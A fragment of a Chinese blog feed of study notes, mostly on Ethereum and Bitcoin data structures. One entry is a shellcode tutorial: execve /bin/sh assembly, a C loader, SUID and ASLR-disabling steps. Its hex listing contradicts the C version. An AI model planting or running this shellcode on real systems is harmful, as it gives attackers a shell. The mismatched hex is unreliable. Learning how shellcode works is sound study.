      <tag>BlockChain</tag>
      
      <tag>ETH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>04-ETH-交易树与收据树</title>
    <link href="/2024/07/29/04-ETH-%E4%BA%A4%E6%98%93%E6%A0%91%E4%B8%8E%E6%94%B6%E6%8D%AE%E6%A0%91/"/>
    <url>/2024/07/29/04-ETH-%E4%BA%A4%E6%98%93%E6%A0%91%E4%B8%8E%E6%94%B6%E6%8D%AE%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h1 id="交易树-MPT"><a href="#交易树-MPT" class="headerlink" title="交易树(MPT)"></a>交易树(MPT)</h1><ul><li>只组织当前区块的交易。</li><li>提供默克尔证明。</li><li>查询操作。</li></ul><h1 id="收据树-MPT"><a href="#收据树-MPT" class="headerlink" title="收据树(MPT)"></a>收据树(MPT)</h1><ul><li>由于</li></ul><h1 id="bloom-filter"><a href="#bloom-filter" class="headerlink" title="bloom filter"></a>bloom filter</h1><ul><li>高效查找存在性。</li><li>生成摘要，查看映射函数是否存在。</li><li>哈希之后映射。 </li><li>可能会误报，不会不报。</li><li>false positive。</li><li>不支持删除操作。</li><li>添加计数器才可以进行参数操作，类似链接。</li><li>每个交易都有一个bloom fliter。</li><li>块头有一个总的Bloom filter。</li><li>快速过滤。</li><li><img src="/../pic/Pasted%20image%2020240729223126.png"></li></ul><h1 id="交易驱动状态机-ETH"><a href="#交易驱动状态机-ETH" class="headerlink" title="交易驱动状态机-ETH"></a>交易驱动状态机-ETH</h1><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h2 id="账户状态是否可以只包含这两个账号的状态。"><a href="#账户状态是否可以只包含这两个账号的状态。" class="headerlink" title="账户状态是否可以只包含这两个账号的状态。"></a>账户状态是否可以只包含这两个账号的状态。</h2><ul><li>不方便找到账户的信息。</li><li>新建区块需要找到创世区块。</li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><h2 id="交易树与收据树的创建"><a href="#交易树与收据树的创建" class="headerlink" title="交易树与收据树的创建"></a>交易树与收据树的创建</h2><p><img src="/../pic/Pasted%20image%2020240729225256.png"></p><ul><li>交易树的创建。</li><li>收据树的创建。</li></ul><h2 id="DeriveSha"><a href="#DeriveSha" class="headerlink" title="DeriveSha"></a>DeriveSha</h2><p>![[Pasted%20image%2020240729225540.png]]</p><h2 id="trie"><a href="#trie" class="headerlink" title="trie"></a>trie</h2><p><img src="/../pic/Pasted%20image%2020240729225626.png"></p><h1 id="收据树的结构"><a href="#收据树的结构" class="headerlink" title="收据树的结构"></a>收据树的结构</h1><p><img src="/../pic/Pasted%20image%2020240729225710.png"></p><ul><li>bloom：bloom filter</li><li>logs：根据logs产生相应的bloom filter。</li></ul><h2 id="区块头的数据结构"><a href="#区块头的数据结构" class="headerlink" title="区块头的数据结构"></a>区块头的数据结构</h2><p><img src="/../pic/Pasted%20image%2020240729225847.png"></p><h2 id="create-bloom函数"><a href="#create-bloom函数" class="headerlink" title="create bloom函数"></a>create bloom函数</h2><p><img src="/../pic/Pasted%20image%2020240729225947.png"></p><ul><li>映射三个位置。</li></ul><h2 id="查询bloom-filter"><a href="#查询bloom-filter" class="headerlink" title="查询bloom filter"></a>查询bloom filter</h2><p><img src="/../pic/Pasted%20image%2020240729230334.png"></p>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>ETH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>ETH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ShellCode</title>
    <link href="/2024/07/29/shellcode/"/>
    <url>/2024/07/29/shellcode/</url>
    
    <content type="html"><![CDATA[<h1 id="ubuntu-16-32位"><a href="#ubuntu-16-32位" class="headerlink" title="ubuntu(16 32位)"></a>ubuntu(16 32位)</h1><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="什么是shellcode"><a href="#什么是shellcode" class="headerlink" title="什么是shellcode"></a>什么是shellcode</h2><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode<strong>机器码</strong>，让电脑可以执行攻击者的任意指令。</p><h2 id="汇编码与机器码"><a href="#汇编码与机器码" class="headerlink" title="汇编码与机器码"></a>汇编码与机器码</h2><h3 id="机器码"><a href="#机器码" class="headerlink" title="机器码"></a>机器码</h3><p>可以直接在CPU运行的代码，一般就是可以用二进制代码来展示。</p><h3 id="汇编码"><a href="#汇编码" class="headerlink" title="汇编码"></a>汇编码</h3><p>就是币机器码高级一点的语言，通过基本的语言实现操作系统的基础功能。</p><h1 id="shellcode代码"><a href="#shellcode代码" class="headerlink" title="shellcode代码"></a>shellcode代码</h1><h2 id="汇编代码-目标机32bit的ubuntu16"><a href="#汇编代码-目标机32bit的ubuntu16" class="headerlink" title="汇编代码(目标机32bit的ubuntu16)"></a>汇编代码(目标机32bit的ubuntu16)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asm">section .text<br>section .text<br>    global _start<br><br>_start:<br>    xor eax, eax<br>    push eax<br>    push 0x68732f2f<br>    push 0x6e69622f<br>    mov ebx, esp<br>    push eax<br>    push ebx<br>    mov ecx, esp<br>    xor edx, edx<br>    mov al, 0xb<br>    int 0x80<br></code></pre></td></tr></table></figure><h2 id="使用汇编码"><a href="#使用汇编码" class="headerlink" title="使用汇编码"></a>使用汇编码</h2><h3 id="1-上述代码保存为文件（shellcode-asm）"><a href="#1-上述代码保存为文件（shellcode-asm）" class="headerlink" title="1.上述代码保存为文件（shellcode.asm）"></a>1.上述代码保存为文件（shellcode.asm）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim shellcode.asm<br></code></pre></td></tr></table></figure><h3 id="2-进行汇编"><a href="#2-进行汇编" class="headerlink" title="2.进行汇编"></a>2.进行汇编</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nasm -f elf32 shellcode.asm -o shellcode.o<br></code></pre></td></tr></table></figure><h3 id="3-进行链接"><a href="#3-进行链接" class="headerlink" title="3.进行链接"></a>3.进行链接</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ld -m elf_i386 shellcode.o -o shellcode<br></code></pre></td></tr></table></figure><h3 id="4-设置SUID位（可选）"><a href="#4-设置SUID位（可选）" class="headerlink" title="4.设置SUID位（可选）"></a>4.<strong>设置SUID位（可选）</strong></h3><p>以root权限执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo chown root:root shellcode<br>sudo chmod u+s shellcode<br></code></pre></td></tr></table></figure><h3 id="5-禁用ASLR（可选）"><a href="#5-禁用ASLR（可选）" class="headerlink" title="5.禁用ASLR（可选）"></a>5.<strong>禁用ASLR（可选）</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo sysctl -w kernel.randomize_va_space=0<br></code></pre></td></tr></table></figure><h3 id="6-运行可执行文件"><a href="#6-运行可执行文件" class="headerlink" title="6.运行可执行文件"></a>6.运行可执行文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./shellcode<br></code></pre></td></tr></table></figure><h2 id="汇编代码转为机器码"><a href="#汇编代码转为机器码" class="headerlink" title="汇编代码转为机器码"></a>汇编代码转为机器码</h2><h3 id="编译为二进制文件"><a href="#编译为二进制文件" class="headerlink" title="编译为二进制文件"></a>编译为二进制文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nasm -f bin shellcode.asm -o shellcode.bin<br></code></pre></td></tr></table></figure><h3 id="查看机器码并转为所需格式"><a href="#查看机器码并转为所需格式" class="headerlink" title="查看机器码并转为所需格式"></a>查看机器码并转为所需格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">xxd -p shellcode.bin | sed &#x27;s/\(..\)/\\x\1/g&#x27; | fold -w 48<br></code></pre></td></tr></table></figure><h2 id="16进制机器码"><a href="#16进制机器码" class="headerlink" title="16进制机器码"></a>16进制机器码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shellcode">\x66\x31\xc0\x66\x50\x66\xbb\x2f\x2f\x73\x68\x66<br>\x53\x66\xbb\x2f\x62\x69\x6e\x66\x53\x66\x89\xe3<br>\x66\x50\x66\x53\x66\x89<br>\xe1\x66\x31\xd2\xb0\x0b\xcd\x80<br></code></pre></td></tr></table></figure><h2 id="C语言使用机器码"><a href="#C语言使用机器码" class="headerlink" title="C语言使用机器码"></a>C语言使用机器码</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-comment">// Shellcode</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = <br><span class="hljs-string">&quot;\x31\xc0\x50\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// Print shellcode length</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Shellcode Length: %ld\n&quot;</span>, <span class="hljs-built_in">strlen</span>(shellcode));<br><br>    <span class="hljs-comment">// Allocate executable memory</span><br>    <span class="hljs-type">void</span> *exec = mmap(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (exec == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;mmap&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Copy shellcode to allocated memory</span><br>    <span class="hljs-built_in">memcpy</span>(exec, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br><br>    <span class="hljs-comment">// Execute shellcode</span><br>    <span class="hljs-type">void</span> (*execute_shellcode)() = (<span class="hljs-type">void</span> (*)())exec;<br>    execute_shellcode();<br><br>    <span class="hljs-comment">// Cleanup</span><br>    munmap(exec, <span class="hljs-keyword">sizeof</span>(shellcode));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>使用 <code>-z execstack</code> 编译选项来允许执行堆栈上的代码:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -z execstack -o shellcode shellcode.c<br></code></pre></td></tr></table></figure><h2 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h2><ul><li>开启shell窗口。</li></ul>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
      <category>CVE-2024-6387</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>03-ETH-状态树</title>
    <link href="/2024/07/25/03-ETH-%E7%8A%B6%E6%80%81%E6%A0%91/"/>
    <url>/2024/07/25/03-ETH-%E7%8A%B6%E6%80%81%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h1 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h1><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><ul><li>addr –&gt;state</li></ul><h2 id="余额证明"><a href="#余额证明" class="headerlink" title="余额证明"></a>余额证明</h2><ul><li>所有账户的哈希表。</li><li>构造默克尔树。</li><li>余额只是一种状态。</li><li>根据哈希值流程验证即可证明，因为根哈希是一定的在某个时间。</li></ul><h3 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h3><h3 id="构造默克尔树"><a href="#构造默克尔树" class="headerlink" title="构造默克尔树"></a>构造默克尔树</h3><h4 id="不排序"><a href="#不排序" class="headerlink" title="不排序"></a>不排序</h4><ul><li>默克尔书不唯一。</li></ul><h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><ul><li>代价太大，新建账户的代价太大。</li></ul><h1 id="trie-检索树"><a href="#trie-检索树" class="headerlink" title="trie(检索树)"></a>trie(检索树)</h1><p><img src="/../pic/Pasted%20image%2020240725182117.png"></p><ul><li>输入不管，结果相同。</li><li>更新局部性比较强。</li><li>存储有点浪费。</li></ul><h1 id="PT压缩检索树"><a href="#PT压缩检索树" class="headerlink" title="PT压缩检索树"></a>PT压缩检索树</h1><p><img src="/../pic/Pasted%20image%2020240725182211.png"></p><ul><li>访问效率增加。</li><li>新增加点，节点可能需要扩展。</li><li>数据稀疏的时候压缩效果好。</li><li>以太坊地址足够稀疏，160位。</li></ul><h1 id="MPT-默克尔压缩检索树"><a href="#MPT-默克尔压缩检索树" class="headerlink" title="MPT(默克尔压缩检索树)"></a>MPT(默克尔压缩检索树)</h1><ul><li>哈希代替指针。</li><li>进行压缩。</li><li>可以证明账户不存在性。</li></ul><h1 id="MMPT-修改的默克尔压缩检索树"><a href="#MMPT-修改的默克尔压缩检索树" class="headerlink" title="MMPT(修改的默克尔压缩检索树)"></a>MMPT(修改的默克尔压缩检索树)</h1><p><img src="/../pic/Pasted%20image%2020240725224548.png"></p><p><img src="/../pic/Pasted%20image%2020240725224916.png"></p><ul><li>以哈希值存储。</li><li>根哈希的值存储在块头节点。</li><li>合约账户的信息存储也是小的MMPT。</li><li>大部分的节点时共享的。</li></ul><h1 id="状态树的历史记录的保存"><a href="#状态树的历史记录的保存" class="headerlink" title="状态树的历史记录的保存"></a>状态树的历史记录的保存</h1><ul><li>可能需要状态退回。</li><li>维护历史记录。</li><li>为了支持回滚。</li></ul><h1 id="区块头数据结构"><a href="#区块头数据结构" class="headerlink" title="区块头数据结构"></a>区块头数据结构</h1><p><img src="/../pic/Pasted%20image%2020240725225444.png"></p><ul><li>root：账户状态树的根哈希。</li><li>TxHash：</li><li>ReciptHash：</li></ul><h1 id="块身的结构"><a href="#块身的结构" class="headerlink" title="块身的结构"></a>块身的结构</h1><p><img src="/../pic/Pasted%20image%2020240725225711.png"></p><h1 id="RLP-Recursive-Length-Profix"><a href="#RLP-Recursive-Length-Profix" class="headerlink" title="RLP(Recursive Length Profix)"></a>RLP(Recursive Length Profix)</h1><ul><li>序列化value的值。</li><li>只支持字符数组。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>ETH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>ETH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>02-ETC-账户</title>
    <link href="/2024/07/25/02-ETC-%E8%B4%A6%E6%88%B7/"/>
    <url>/2024/07/25/02-ETC-%E8%B4%A6%E6%88%B7/</url>
    
    <content type="html"><![CDATA[<h1 id="BTC"><a href="#BTC" class="headerlink" title="BTC"></a>BTC</h1><ul><li>基于交易的。</li><li>需要说明币的来源</li><li>验证与一次性花费完</li></ul><h1 id="ETH"><a href="#ETH" class="headerlink" title="ETH"></a>ETH</h1><ul><li>基于账户的余额管理。</li><li>不说明币的来源。</li><li>也不需要一次性转完。</li><li>天然防御双花攻击。</li></ul><h2 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h2><ul><li>想要收一个交易的两次结果，</li><li>加一个交易次数nonce唯一值。</li><li>以确保交易的唯一性。</li><li>nonce在签名中被保护。</li></ul><h1 id="账户类型"><a href="#账户类型" class="headerlink" title="账户类型"></a>账户类型</h1><h2 id="外部账户"><a href="#外部账户" class="headerlink" title="外部账户"></a>外部账户</h2><ul><li>账户余额</li><li>nonce(counter)</li></ul><h2 id="合约账户"><a href="#合约账户" class="headerlink" title="合约账户"></a>合约账户</h2><ul><li>余额</li><li>nonce</li><li>不能主动发送交易</li><li>可以调用其他合约</li><li>代码</li><li>存储空间</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>ETH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>ETH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>01-ETH-概述</title>
    <link href="/2024/07/25/01-ETH-%E6%A6%82%E8%BF%B0/"/>
    <url>/2024/07/25/01-ETH-%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="ETH特殊性"><a href="#ETH特殊性" class="headerlink" title="ETH特殊性"></a>ETH特殊性</h1><ul><li>提高内存要求。</li><li>goust共识机制。</li><li>智能合约，去中心化的合约</li></ul><h1 id="去中心化的货币与法币的优势"><a href="#去中心化的货币与法币的优势" class="headerlink" title="去中心化的货币与法币的优势"></a>去中心化的货币与法币的优势</h1><ul><li>跨国转账</li></ul><h1 id="去中心化合同有什么用"><a href="#去中心化合同有什么用" class="headerlink" title="去中心化合同有什么用"></a>去中心化合同有什么用</h1><ul><li>跨国签署。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>ETH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>ETH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>12 BTC-思考</title>
    <link href="/2024/07/24/12%20BTC-%E6%80%9D%E8%80%83/"/>
    <url>/2024/07/24/12%20BTC-%E6%80%9D%E8%80%83/</url>
    
    <content type="html"><![CDATA[<h1 id="1-哈希指针"><a href="#1-哈希指针" class="headerlink" title="1.哈希指针"></a>1.哈希指针</h1><p><img src="/../pic/Pasted%20image%2020240724184250.png"></p><ul><li>只是哈希，没有指针。</li><li>存储在（key,value）数据库中，level DB</li></ul><h1 id="2-区块恋"><a href="#2-区块恋" class="headerlink" title="2.区块恋"></a>2.区块恋</h1><p>特点：私钥分开</p><ul><li>降低账户安全性。</li><li>丢失很难找回。</li><li>永久保存死钱，浪费空间。</li><li>安全方式：多种签名。</li></ul><h1 id="3-分布式共识"><a href="#3-分布式共识" class="headerlink" title="3. 分布式共识"></a>3. 分布式共识</h1><p> 为什么区块链系统能够绕过分布式共识中的那些不可能结论。</p><p>没有达到真正的共识。</p><h1 id="4-比特币的稀缺性"><a href="#4-比特币的稀缺性" class="headerlink" title="4.比特币的稀缺性"></a>4.比特币的稀缺性</h1><p>稀缺性不适合作为货币</p><h1 id="5-量子计算"><a href="#5-量子计算" class="headerlink" title="5.量子计算"></a>5.量子计算</h1><ul><li>公钥也不是明文存储。</li><li>SHA-256</li><li>最好是一次性转移。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>BTC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BTC</tag>
      
      <tag>BlockChain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>11 BTC-匿名性</title>
    <link href="/2024/07/24/11%20BTC-%E5%8C%BF%E5%90%8D%E6%80%A7/"/>
    <url>/2024/07/24/11%20BTC-%E5%8C%BF%E5%90%8D%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="匿名性"><a href="#匿名性" class="headerlink" title="匿名性"></a>匿名性</h1><p>BTC就是化名。</p><h1 id="破坏匿名性的可能"><a href="#破坏匿名性的可能" class="headerlink" title="破坏匿名性的可能"></a>破坏匿名性的可能</h1><h2 id="账户关联"><a href="#账户关联" class="headerlink" title="账户关联"></a>账户关联</h2><p>交易时，需要一个找零钱的地址，是输入用户的账户。</p><p>钱包交易时</p><h2 id="实体世界联系"><a href="#实体世界联系" class="headerlink" title="实体世界联系"></a>实体世界联系</h2><p>交集反推，可以把账户与个人联系起来。</p><h1 id="提高匿名性方式"><a href="#提高匿名性方式" class="headerlink" title="提高匿名性方式"></a>提高匿名性方式</h1><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><ul><li>破坏匿名性原因：账户交易集中</li><li>coin mixing：混合币，没有信誉度高的机构。</li><li>在线钱包可能或有币混合的性质。</li><li>交易所不泄露交易记录可以。</li><li></li></ul><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><ul><li>tor</li><li>多路径转发</li></ul><h1 id="零知识证明"><a href="#零知识证明" class="headerlink" title="零知识证明"></a>零知识证明</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><img src="/../pic/Pasted%20image%2020240724182711.png"></p><h2 id="同态隐藏（数学基础）"><a href="#同态隐藏（数学基础）" class="headerlink" title="同态隐藏（数学基础）"></a>同态隐藏（数学基础）</h2><p><img src="/../pic/Pasted%20image%2020240724182851.png"></p><ul><li>无输入碰撞，唯一对应。</li><li>加密函数不可逆。</li><li>同台运算。</li><li>x与y进行随机化处理，使得x与y的运算结果不变。</li></ul><h1 id="盲签名"><a href="#盲签名" class="headerlink" title="盲签名"></a>盲签名</h1><p><img src="/../pic/Pasted%20image%2020240724183744.png"></p><ul><li>2、3 步的serialnum为明文。</li></ul><h1 id="零币与零钞"><a href="#零币与零钞" class="headerlink" title="零币与零钞"></a>零币与零钞</h1><p><img src="/../pic/Pasted%20image%2020240724183837.png"></p><ul><li>随机源必须及时销毁。</li><li>还是要与实体交易还是容易泄露匿名性。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>BTC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BTC</tag>
      
      <tag>BlockChain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>10 BTC-问答</title>
    <link href="/2024/07/24/10%20BTC-%E9%97%AE%E7%AD%94/"/>
    <url>/2024/07/24/10%20BTC-%E9%97%AE%E7%AD%94/</url>
    
    <content type="html"><![CDATA[<h1 id="1-转账目标地址离线，对于转账交易有什么影响"><a href="#1-转账目标地址离线，对于转账交易有什么影响" class="headerlink" title="1. 转账目标地址离线，对于转账交易有什么影响"></a>1. 转账目标地址离线，对于转账交易有什么影响</h1><p>无影响</p><h1 id="2-全节点收到的交易会不会出现全新的接受地址"><a href="#2-全节点收到的交易会不会出现全新的接受地址" class="headerlink" title="2.全节点收到的交易会不会出现全新的接受地址"></a>2.全节点收到的交易会不会出现全新的接受地址</h1><p>会，生成新的公钥不会告诉别人，在UTXO中出现才能别被人发现</p><h1 id="3-私钥丢失怎么办"><a href="#3-私钥丢失怎么办" class="headerlink" title="3.私钥丢失怎么办"></a>3.私钥丢失怎么办</h1><p>没办法</p><h1 id="4-私钥泄露怎么办"><a href="#4-私钥泄露怎么办" class="headerlink" title="4.私钥泄露怎么办"></a>4.私钥泄露怎么办</h1><h1 id="5-转账写错地址怎么办"><a href="#5-转账写错地址怎么办" class="headerlink" title="5.转账写错地址怎么办"></a>5.转账写错地址怎么办</h1><p>保存在一个由信息生成的公钥，是不合理的公钥。</p><h1 id="6-return的无条件返回错误怎么通过验证怎么写上区块链"><a href="#6-return的无条件返回错误怎么通过验证怎么写上区块链" class="headerlink" title="6. return的无条件返回错误怎么通过验证怎么写上区块链"></a>6. return的无条件返回错误怎么通过验证怎么写上区块链</h1><p>验证：验证的时候不会被执行，只有在花销的时候才会执行return后面的语句。</p><h1 id="7-矿工偷答案"><a href="#7-矿工偷答案" class="headerlink" title="7.矿工偷答案"></a>7.矿工偷答案</h1><p>区块的的哈希值包含里面的，改成别人的地址，根哈希也需要改变。</p>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>BTC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BTC</tag>
      
      <tag>BlockChain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>09 BTC-分叉</title>
    <link href="/2024/07/24/09%20BTC-%E5%88%86%E5%8F%89/"/>
    <url>/2024/07/24/09%20BTC-%E5%88%86%E5%8F%89/</url>
    
    <content type="html"><![CDATA[<h1 id="造成原因"><a href="#造成原因" class="headerlink" title="造成原因"></a>造成原因</h1><h2 id="state-fork"><a href="#state-fork" class="headerlink" title="state fork"></a>state fork</h2><ul><li>对于当前区块有分歧。</li><li>同时获取到合法块。</li></ul><h3 id="forking-attack"><a href="#forking-attack" class="headerlink" title="forking attack"></a>forking attack</h3><ul><li>deliberate fork</li></ul><h2 id="协议分叉-protocol-fork"><a href="#协议分叉-protocol-fork" class="headerlink" title="协议分叉(protocol fork)"></a>协议分叉(protocol fork)</h2><h3 id="硬分叉"><a href="#硬分叉" class="headerlink" title="硬分叉"></a>硬分叉</h3><p><img src="/../pic/Pasted%20image%2020240723233030.png"></p><ul><li>对于区块链的基本信息的修改，接受与不接受的人之间的分叉。</li><li>接受的人认为修改过的为合法区块，未修改为非法区块。</li><li>典型的为block size limit</li><li>永久性分叉。</li><li>加一个chainID作为链的标识。</li></ul><h3 id="软分叉（sofy-fork）"><a href="#软分叉（sofy-fork）" class="headerlink" title="软分叉（sofy fork）"></a>软分叉（sofy fork）</h3><p><img src="/../pic/Pasted%20image%2020240723233706.png"></p><ul><li>分叉的结果是只有一条链是合法的。</li><li>更新新版本的节点挖的区块可以被识别与认证。</li><li>旧版本的节点挖出来的区块不会被新节点承认，即无法加入最长合法连中。</li><li>旧认新，新不认旧。</li></ul><h4 id="coinbase"><a href="#coinbase" class="headerlink" title="coinbase"></a>coinbase</h4><ul><li>挖矿难度：extra nonce + 4bytes</li><li>extra nonce：前8bit用来作为修改target的数据。</li><li>extra nonce 后面：作为UTXO的根哈希。</li></ul><h4 id="UTXO"><a href="#UTXO" class="headerlink" title="UTXO"></a>UTXO</h4><ul><li>改成默克尔树。</li></ul><h4 id="默克尔树"><a href="#默克尔树" class="headerlink" title="默克尔树"></a>默克尔树</h4><ul><li>验证交易是否在区块内。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>BTC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BTC</tag>
      
      <tag>BlockChain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>08 BTC-脚本</title>
    <link href="/2024/07/22/08%20BTC-%E8%84%9A%E6%9C%AC/"/>
    <url>/2024/07/22/08%20BTC-%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="1-交易信息"><a href="#1-交易信息" class="headerlink" title="1. 交易信息"></a>1. 交易信息</h1><h3 id="a-交易结构"><a href="#a-交易结构" class="headerlink" title="a.交易结构"></a>a.交易结构</h3><p><img src="/../pic/Pasted%20image%2020240722222013.png"></p><p>说明：</p><ul><li>locktime：生效延迟时间。</li><li>vin：输入信息。</li><li>vout：输出信息。</li><li>blockhash：哈希值。</li><li>time：交易时间。</li><li>blocktime：区块产生时间。</li></ul><h3 id="b-交易的输入"><a href="#b-交易的输入" class="headerlink" title="b.交易的输入"></a>b.交易的输入</h3><p><img src="/../pic/Pasted%20image%2020240722222428.png"></p><ul><li>txid：之前交易的哈希值。</li><li>vout：第几个输出结果。</li><li>scriptSig：输入脚本。</li></ul><h3 id="c-交易输出"><a href="#c-交易输出" class="headerlink" title="c.交易输出"></a>c.交易输出</h3><p><img src="/../pic/Pasted%20image%2020240722222713.png"></p><ul><li>reqSigs：需要多少个签名（单&#x2F;多重签名）。</li><li>address：输出的地址。</li></ul><h3 id="d-交易验证"><a href="#d-交易验证" class="headerlink" title="d.交易验证"></a>d.交易验证</h3><p><img 